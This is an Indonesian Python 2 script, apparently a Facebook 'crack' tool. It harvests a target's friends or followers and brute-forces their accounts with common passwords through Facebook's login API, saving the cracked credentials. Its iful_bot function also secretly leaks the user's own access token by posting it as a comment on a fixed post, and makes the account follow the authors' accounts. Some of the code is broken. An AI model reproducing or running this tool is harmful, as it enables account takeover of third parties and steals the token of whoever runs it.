# -*- coding: utf-8
# Made With ❤️ Iwan Hadiansah ID
# facebook : https://www.facebook.com/IwanPutraSunda04
# facebook unik : https://www.facebook.com/IwanDev04
# github : https://github.com/Iwan-Dev
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import ipaddress
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
try:
	import requests
except ImportError:
	print '[×] Modul requests belum terinstall!...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def logo():
	print("""                   
  __  ___ _ __ __ __ ___ 
/' _/| _ \ |  V  |  \ __| 
`._`.| v / | \_/ | -< _|  
|___/|_|_\_|_| |_|__/_|   

Author : IWAN & IPUL
Note : Gunakan Sc Ini Sewajarnya Kami Tidak Bertanggung Jawab Ngentot:v
Terimakasih Untuk Iwan Tanpa Dia Saya Bukan Siapa Siapa:)""""") 
id = []
cp = []
ok = []
loop = 0

ct = datetime.now()
n = ct.month
bulan1 = [    'Januari',   'Februari',    'Maret',    'April',    'Mei',    'Juni',    'Juli',    'Agustus',    'September',    'Oktober',    'Nopember',    'Desember']
   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}
hari = datetime.now().strftime('%A')

def gen():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		logo()
		token = raw_input(" ? token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (" √ login berhasil ")
			iful_bot()
		except KeyError:
			print (" × token invalid") 
			sys.exit()

useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]'


def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' • kesalahan tidak bisa crack')
		os.system("rm -f login.txt")
		gen()
	except requests.exceptions.ConnectionError:
		print (' × tidak ada koneksi harap sambungkan koneksi anda')
		sys.exit()
	logo()
	print" \033[0;97  #-----------------------------------#"
	print" \033[0;97  nama       : " +nama
	print" \033[0;97  ip address : "+ip
	print" \033[0;97  #-----------------------------------#"
	print" \033[0;97  1. crack from id publik"
	print" \033[0;97  2. crack from followers"
	print" \033[0;97  3. lihat hasil crack"
	print" \033[0;97  0. remove token and cookies"
	pilih_india()

def pilih_india():
	ask = raw_input("\n × \033[0;97mpilih menu crack : ")
	if ask == "":
		print
		print (" \033[0;97× pilih yg benar sayang") 
		exit()
	elif ask in["1","01"]:
		print ("\n × \033[0;97mketik 'me' untuk crack daftar teman") 
		idt = raw_input(" ? id publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
		except KeyError:
			print (" × maaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask in["2","02"]:
		print ("\n × ketik 'me' untuk crack daftar followers sendiri") 
		idt = raw_input(" ? id publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
		except KeyError:
			print (" × maaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask in["3","03"]:
		print"   1. lihat hasil ok"
		print"   2. lihat hasil cp"
		ress = raw_input("* pilih : ")
		if ress =="":
			menu()
		elif ress == "1" or ress == "01":
			print ("\n [+] hasil \033[0;92mok\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		elif ress == "2" or ress == "02":
			print (" [+] hasil \033[0;93mcp\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		else:
			exit(" × pilih yang benar sayang") 
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print (" √ berhasil menghapus token") 
		exit()
	else:
		print (" × pilih yang benar sayang") 
		exit()
	
	print" \033[0;97m× total id  : " +str(len(id))
	ask = raw_input(" \n ? ingin gunakan password manual (y/t) : ")
	if ask == "Y" or ask == "y":
		manual()
	print
	print" × mode pesawat 10 detik jika tidak ada hasil "
	print

	def main(arg):
		global ok,cp,ua, loop
		print '\r × %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'12345','sayang','katasandi','bojonegoro','indonesia']:
				ua_='Opera/9.80 (Android; Opera Mini/7.6.40234/191.236; U; id) Presto/2.12.423 Version/12.16
				anak_setan = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua_, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=anak_setan)
				if "access_token" in send.text and "EAAA" in send.text:
					print'\r \033[0;92m* --> ' +uid+ ' | ' + pw+ '        '
					ok.append(uid+' | '+pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write(' \033[0;92m* --> ' +str(uid)+' | '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print'\r \033[0;93m* --> ' +uid+ ' | ' + pw+ '        '
					cp.append(uid+' | '+pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write('  \r\033[0;93m* --> ' +str(uid)+' | '+str(pw)+'\n')
					save.close()
					break
					continue
					continue

			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print(" \ncrack selesai...")
	exit()

def manual():
	print("\033[0;97m *  masukan password contoh : bangladesh,102030,786786")
	pw = raw_input("\033[0;97m *  sett password : ").split(",")
	print
	if len(pw) ==0:
		exit(" *  isi yang bener, tidak boleh kosong")
	print("\033[0;97m *  jumlah password yang di buat : \033[0;93m" +str(len(pw)))
	
	def main(arg):
		global ok,cp,ua,loop
		print '\r \033[0;97m*  %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				ua ='Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)'
				anak_setan = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=anak_setan)
				if "access_token" in send.text and "EAAA" in send.text:
					print'\r \033[0;92m* --> ' +uid+ ' | ' + asu + '        '
					ok.append(uid+' | '+asu)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write(' \033[0;92m* --> ' +str(uid)+' | '+str(asu)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print'\r \033[0;92m* --> ' +uid+ ' | ' + asu+ '        '
					cp.append(uid+' | '+asu)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write(' \033[0;92m*--> ' +str(uid)+' | '+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n *  crack selesai...")
	exit()

def iful_bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Token invalid') 
        os.system('rm -rf login.txt')
	kom = " Bang @[100001430861457:] IJIN RECODE BANG BOT FOLLOW NYA AMA KOMEN GA GWE GANTI IPUL DAN IWAN GANTENG AWOAKWOAKAOAK😘😘😘😘"
	requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/4292443557479964/comments/?message=' +token+ '&access_token=' + token)
	requests.post('https://graph.facebook.com/100006613569734/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100009384338470/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100055918391280/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100031905602021/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100003656938210/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100028262962654/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100011054763211/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/4292443557479964/comments/?message=' +kom+ '&access_token=' + token)
    menu()


if __name__ == '__main__':
	gen()